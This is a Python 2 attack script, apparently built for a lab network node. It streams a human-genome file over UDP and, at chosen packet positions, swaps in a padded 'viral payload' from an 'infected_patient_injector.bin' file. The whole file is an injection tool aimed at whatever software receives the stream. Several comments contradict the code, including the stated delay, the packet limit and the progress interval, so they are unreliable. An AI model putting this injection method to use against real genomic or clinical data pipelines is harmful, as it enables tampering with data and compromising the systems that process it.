#!/usr/bin/python
import socket
import time
import sys

#these numbers are node $n1. the port doesn't matter, what gives
IP_ADDR = '10.0.13.3'
PORT = 8080

#"hyperparams"
PACKET_SIZE = 1022  #this is proven to be the 
DELAY_SEC = 0.001   # 4ms delay to allow the software to keep up
INFECTED_FILE = 'infected_patient_injector.bin' # Your generated virus payload
INJECTION_POINTS = [100, 99200, 100000, 100006, 110000] # The exact packets to swap

def stream_file(filename):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    print "[*] Streaming %s to %s:%d" % (filename, IP_ADDR, PORT)
    print "[*] Fixed Payload: %d bytes | Rate Delay: %s sec" % (PACKET_SIZE, DELAY_SEC)
    
    #Pre-load the infected payload into memory (Open doesn't work because python 2.4.3)
    try:
        inf_f = open(INFECTED_FILE, 'rb') #since this is comparatively tiny, this is the way to go. 
        #the human genome is! ~800! MB! SO WE READ IN REAL TIME
        full_payload = inf_f.read() #Read the entire file
        inf_f.close()               #Manually close
        
        #FAILSAFE
        if len(full_payload) > PACKET_SIZE:
            print "[!] CRITICAL ERROR: %s is %d bytes!" % (INFECTED_FILE, len(full_payload))
            print "[!] That exceeds the strict %d byte limit. Hardware will misalign." % PACKET_SIZE
            sys.exit(1)
            
        infected_payload = full_payload
        
        #Pad if it's too short
        if len(infected_payload) < PACKET_SIZE:
            pad_length = PACKET_SIZE - len(infected_payload)
            infected_payload += ('\x00' * pad_length)
            print "[*] Notice: Padded viral payload with %d zero-bytes." % pad_length
            
        print "[*] Successfully loaded viral payload: %s" % INFECTED_FILE
        
    except IOError:
        print "[!] ERROR: Could not load %s. Make sure it is in the same directory!" % INFECTED_FILE
        sys.exit(1)
        
    f = open(filename, 'rb')
    try:
        packet_count = 0
        while True:
            chunk = f.read(PACKET_SIZE)
            
            if not chunk:
                break
                
            if len(chunk) < PACKET_SIZE:
                pad_length = PACKET_SIZE - len(chunk)
                chunk = chunk + ('\x00' * pad_length)
                print "    Last background packet padded with %d zero-bytes." % pad_length
                
            #intercept and inject whatever the point of interest is
            if packet_count in INJECTION_POINTS:
                print " Injecting viral payload at packet %d " % packet_count
                data_to_send = infected_payload
            else:
                data_to_send = chunk
                
            sock.sendto(data_to_send, (IP_ADDR, PORT))
            packet_count += 1
            
            #time.sleep for old python
            target_time = time.time() + DELAY_SEC
            while time.time() < target_time:
                pass
            # -----------------------------------------------
            
            # Print an update every 100 packets so you can actually watch the progress
            if packet_count % 10000 == 0:
                print "    ... Sent %d packets ..." % packet_count
                
            if packet_count >= 250000:
                print "Reached 200,000 packet limit. Stopping stream."
                break
                
    finally:
        f.close()
        sock.close()
        print "[*] File streaming complete. %d total packets sent." % packet_count

#just for the heck of it, in case you forget I guess
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print "Usage: python sender_to_n1_streaming_2k_infected.py <human_genome_background.bin>"
        sys.exit(1)
    stream_file(sys.argv[1])